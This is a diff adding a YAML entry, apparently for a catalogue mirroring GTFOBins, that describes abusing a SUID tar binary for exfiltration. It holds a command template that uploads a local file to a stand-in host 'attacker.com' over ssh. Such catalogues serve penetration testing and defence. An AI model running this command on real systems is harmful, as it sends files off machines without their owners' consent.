@@ -1,0 +1,25 @@
+id: gtfobins/tar/upload/suid
+type: binary
+platform: linux
+name: tar
+phases:
+- exfiltration
+- privilege-escalation
+capabilities:
+- file-upload
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh
+  comment: The attacker box must have the `rmt` utility installed.
+references:
+- https://gtfobins.github.io/gtfobins/tar/
+tags:
+- linux
+- unix
+- gtfobins
